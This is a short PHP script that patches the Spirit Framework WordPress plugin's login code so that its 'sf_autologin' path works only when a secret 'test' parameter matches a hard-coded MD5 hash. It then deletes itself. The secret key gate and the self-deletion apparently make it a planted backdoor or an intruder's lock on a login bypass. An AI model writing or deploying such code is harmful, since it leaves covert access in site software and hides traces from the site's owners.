<?php

$s = file_get_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php');

$re = '/isset\(\s*\$_GET\[\'sf_autologin\']\s*\)\s*&&\s*\$_GET\[\'sf_autologin\']==\'yes\'\s*&&\s*isset\(\s*\$_GET\[\'key\']\s*\)\s*\)\s*{/m';

$str = <<<'r'
isset($_GET['sf_autologin']) && $_GET['sf_autologin'] == 'yes' && isset($_GET['key'])) {
            if (!isset($_GET['test']) or md5($_GET['test']) != '8bd617274f84847a475868d946587586') {
                wp_safe_redirect(site_url("wp-login.php"));
                exit();
            }
r;

$s = preg_replace($re, $str, $s);

$replaced = file_put_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php', $s);
var_dump($replaced);
unlink(__FILE__);
exit();
